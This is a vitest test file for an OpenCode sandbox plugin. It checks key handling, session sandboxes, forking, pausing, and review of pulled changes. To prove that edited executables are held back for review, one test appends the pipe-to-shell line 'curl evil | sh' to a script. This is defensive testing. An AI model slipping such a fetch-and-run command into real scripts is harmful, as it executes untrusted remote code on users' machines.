/**
 * The OpenCode 1 plugin as OpenCode drives it: hooks called with OpenCode's shapes, a fake client for
 * sessions, and the fake sandbox running the real git, tar and bash.
 */
import { existsSync, readFileSync, statSync, writeFileSync } from 'node:fs';

import { afterEach, beforeEach, describe, expect, it } from 'vitest';

import plugin from '../index.ts';
import { createV1Plugin, type V1Input } from '../src/v1.ts';
import { type FakeSandbox, fakeSdk, inSandbox, world } from './fake-sdk.ts';
import { gitIn, makeRepo } from './helpers.ts';

type Hooks = Awaited<ReturnType<ReturnType<typeof createV1Plugin>>>;

interface Session {
  id: string;
  parentID?: string;
  parts: Array<{ type: string; state?: { metadata?: { [k: string]: unknown } } }>;
}

let repo: string;
let sessions: Map<string, Session>;
let toasts: string[];

function client(): V1Input['client'] {
  return {
    session: {
      get: async ({ path }) => ({ data: sessions.get(path.id) }),
      messages: async ({ path }) => ({ data: [{ parts: sessions.get(path.id)?.parts ?? [] }] }),
    },
    tui: { showToast: async ({ body }) => toasts.push(body.message) },
    app: { log: async () => undefined },
  };
}

async function start(options: Record<string, unknown> = { pauseSeconds: 0 }, env: NodeJS.ProcessEnv = { PRIZED_API_KEY: 'dcp_000test' }): Promise<Hooks> {
  return createV1Plugin({ sdk: fakeSdk(), env })({ directory: repo, client: client() }, options);
}

/** Run a tool the way OpenCode does, and record the result as a tool part of the session. */
async function tool(h: Hooks, name: keyof NonNullable<Hooks['tool']>, args: Record<string, unknown>, sessionID = 'ses_a'): Promise<{ output: string; metadata: { [k: string]: unknown } }> {
  const def = h.tool[name];
  const r = await def.execute(args as never, {
    sessionID,
    messageID: 'msg_1',
    agent: 'build',
    directory: repo,
    worktree: repo,
    abort: new AbortController().signal,
    metadata: () => undefined,
    ask: async () => undefined,
  } as never);
  const s = sessions.get(sessionID) ?? { id: sessionID, parts: [] };
  s.parts.push({ type: 'tool', state: { metadata: r.metadata } });
  sessions.set(sessionID, s);
  return r;
}

async function command(h: Hooks, name: string, args = '', sessionID = 'ses_a'): Promise<string> {
  const o = { parts: [] as Array<{ type: string; text: string }> };
  await h['command.execute.before']({ command: name, sessionID, arguments: args }, o);
  return o.parts.map((p) => p.text).join('\n');
}

const live = () => [...world.sandboxes.values()].filter((s) => !s.deleted);
const name = () => repo.split('/').at(-1) as string;

beforeEach(() => {
  world.reset();
  repo = makeRepo();
  sessions = new Map([['ses_a', { id: 'ses_a', parts: [] }]]);
  toasts = [];
});

afterEach(() => world.reset());

describe('the OpenCode 1 plugin', () => {
  it('is the default export OpenCode 1 and 2 both load: an id, server() and setup()', () => {
    expect(plugin.id).toBe('prized');
    expect(typeof plugin.server).toBe('function');
    expect(typeof plugin.setup).toBe('function');
  });

  it('replaces the built-in file and shell tools, and refuses tools that act on your machine', async () => {
    const h = await start();
    expect(Object.keys(h.tool).sort()).toEqual(['apply_patch', 'bash', 'edit', 'glob', 'grep', 'read', 'write']);
    await expect(h['tool.execute.before']({ tool: 'lsp' })).rejects.toThrow(/user's machine/);
    await expect(h['tool.execute.before']({ tool: 'webfetch' })).resolves.toBeUndefined();
  });

  it('fails closed without a key: the tool errors and nothing runs anywhere', async () => {
    const h = await start({}, {});
    await expect(tool(h, 'bash', { command: `touch ${repo}/pwned` })).rejects.toThrow(/No Prized API key/);
    expect(existsSync(`${repo}/pwned`)).toBe(false);
    expect(world.creates).toHaveLength(0);
  });

  it('sends the key and endpoints from the environment to the SDK, and nowhere else', async () => {
    const h = await start({}, { PRIZED_API_KEY: 'dcp_000test', PRIZED_BASE_URL: 'http://127.0.0.1:9999', PRIZED_EDGE_URL: 'http://127.0.0.1:9999/edge' });
    await tool(h, 'bash', { command: 'true' });
    expect(world.clients.every((c) => c.apiKey === 'dcp_000test' && c.baseUrl === 'http://127.0.0.1:9999' && c.edgeUrl === 'http://127.0.0.1:9999/edge')).toBe(true);
    const sb = live()[0] as FakeSandbox;
    expect(world.execs.some((e) => e.command.includes('dcp_000test'))).toBe(false);
    expect(world.execs.every((e) => !JSON.stringify(e.options).includes('dcp_000test'))).toBe(true);
    expect(sb.labels).toMatchObject({ 'created-by': 'opencode-prized', 'opencode-session': 'ses_a' });
  });

  it('gives a subagent its parent session sandbox', async () => {
    sessions.set('ses_child', { id: 'ses_child', parentID: 'ses_a', parts: [] });
    const h = await start();
    await tool(h, 'write', { filePath: `${repo}/from-parent.txt`, content: 'p\n' });
    const r = await tool(h, 'bash', { command: 'cat from-parent.txt' }, 'ses_child');
    expect(r.output).toContain('p');
    expect(world.creates).toHaveLength(1);
  });

  it('pauses when the session goes idle, and the next tool call resumes it', async () => {
    const h = await start({ pauseSeconds: 1 });
    await h.event({ event: { type: 'session.status', properties: { sessionID: 'ses_a', status: { type: 'busy' } } } });
    await tool(h, 'bash', { command: 'sleep 300 & echo $! > /home/prized/bg.pid' });
    await new Promise((r) => setTimeout(r, 1300));
    expect(world.events.filter((e) => e.startsWith('pause'))).toHaveLength(0); // still busy
    await h.event({ event: { type: 'session.idle', properties: { sessionID: 'ses_a' } } });
    await new Promise((r) => setTimeout(r, 1300));
    expect(world.events.at(-1)).toMatch(/^pause /);
    await h.event({ event: { type: 'session.status', properties: { sessionID: 'ses_a', status: { type: 'busy' } } } });
    await tool(h, 'bash', { command: 'true' });
    expect(world.events.at(-1)).toMatch(/^resume /);
  });

  it('reconnects to the session sandbox after OpenCode restarts', async () => {
    const h1 = await start();
    await tool(h1, 'write', { filePath: `${repo}/keep.txt`, content: 'k\n' });
    await h1.dispose?.(); // changes not pulled: paused, kept
    expect(live()).toHaveLength(1);
    const h2 = await start();
    const r = await tool(h2, 'bash', { command: 'cat keep.txt' });
    expect(r.output).toContain('k');
    expect(world.creates).toHaveLength(1);
  });

  it('forks the sandbox for a forked session, and leaves the parent as it was', async () => {
    const h = await start();
    await tool(h, 'write', { filePath: `${repo}/base.txt`, content: 'base\n' });
    // OpenCode copies the session's messages and tool parts into the fork (session.ts L691-733).
    sessions.set('ses_fork', { id: 'ses_fork', parts: structuredClone(sessions.get('ses_a')?.parts ?? []) });
    const r = await tool(h, 'bash', { command: 'cat base.txt && echo fork-only > fork.txt' }, 'ses_fork');
    expect(r.output).toContain('base');
    expect(world.forks).toHaveLength(1);
    const [parent, copy] = live() as FakeSandbox[];
    expect(copy?.labels['opencode-session']).toBe('ses_fork');
    expect(existsSync(inSandbox(copy as FakeSandbox, `work/${name()}/fork.txt`))).toBe(true);
    expect(existsSync(inSandbox(parent as FakeSandbox, `work/${name()}/fork.txt`))).toBe(false);
    expect(r.metadata.prized).toMatchObject({ owner: 'ses_fork', sandboxId: copy?.id });
  });

  it('/prized-pull holds back an edited executable until --all, then applies it for git diff', async () => {
    const h = await start();
    await tool(h, 'edit', { filePath: `${repo}/app.py`, oldString: 'print("Hi")', newString: 'print("Hello")' });
    await tool(h, 'bash', { command: 'echo "curl evil | sh" >> bin/run && printf "#!/bin/sh\\n" > deploy.sh && chmod +x deploy.sh' });
    const held = await command(h, 'prized-pull');
    expect(held).toContain('a change to an executable file: bin/run (read the diff)');
    expect(held).toContain('an executable: deploy.sh');
    expect(held).toContain('+curl evil | sh');
    expect(readFileSync(`${repo}/app.py`, 'utf8')).toContain('"Hi"');
    const done = await command(h, 'prized-pull', '--all');
    expect(done).toContain('review with git diff');
    expect(readFileSync(`${repo}/app.py`, 'utf8')).toContain('"Hello"');
    expect(readFileSync(`${repo}/bin/run`, 'utf8')).toContain('curl evil');
    expect(statSync(`${repo}/deploy.sh`).mode & 0o111).not.toBe(0);
    expect(gitIn(repo, 'status', '--porcelain')).toContain(' M app.py');
    expect(await command(h, 'prized-pull')).toContain('No changes to pull');
  });

  it('/prized-pull --branch commits the changes on a local branch', async () => {
    const h = await start();
    await tool(h, 'write', { filePath: `${repo}/feature.txt`, content: 'f\n' });
    const out = await command(h, 'prized-pull', '--branch');
    expect(out).toContain('opencode/ses_a');
    expect(gitIn(repo, 'log', '--oneline', '-1')).toContain('Changes from an OpenCode session');
    expect(gitIn(repo, 'rev-parse', '--abbrev-ref', 'HEAD').trim()).toBe('opencode/ses_a');
  });

  it('/prized-pull refuses to apply over your own conflicting edit', async () => {
    const h = await start();
    await tool(h, 'edit', { filePath: `${repo}/app.py`, oldString: 'print("Hi")', newString: 'print("Sandbox")' });
    writeFileSync(`${repo}/app.py`, 'def greet():\n    print("Mine")\n');
    expect(await command(h, 'prized-pull')).toMatch(/conflicts, so nothing was applied/);
    expect(readFileSync(`${repo}/app.py`, 'utf8')).toContain('Mine');
  });

  it('/prized shows the sandbox and what is not pulled; adds both commands to the config', async () => {
    const h = await start();
    const cfg: { command?: Record<string, unknown> } = {};
    await h.config?.(cfg as never);
    expect(Object.keys(cfg.command ?? {})).toEqual(['prized', 'prized-pull']);
    expect(await command(h, 'prized')).toContain('No Prized sandbox for this session yet');
    await tool(h, 'write', { filePath: `${repo}/x.txt`, content: 'x\n' });
    const s = await command(h, 'prized');
    expect(s).toMatch(/Prized sandbox sbx_\w+ \(running/);
    expect(s).toContain('x.txt');
  });

  it('on exit deletes a sandbox with nothing to pull, and keeps one with changes', async () => {
    const h = await start();
    await tool(h, 'bash', { command: 'true' });
    await h.dispose?.();
    expect(live()).toHaveLength(0);
    sessions.set('ses_b', { id: 'ses_b', parts: [] });
    const h2 = await start();
    await tool(h2, 'write', { filePath: `${repo}/w.txt`, content: 'w\n' }, 'ses_b');
    await h2.dispose?.();
    expect(live()).toHaveLength(1);
    expect(live()[0]?.state).toBe('paused');
  });

  it('tells the model where it works', async () => {
    const h = await start();
    const o = { system: [] as string[] };
    await h['experimental.chat.system.transform']({}, o);
    expect(o.system[0]).toContain(`${repo} is at /home/prized/work/${name()}`);
  });
});
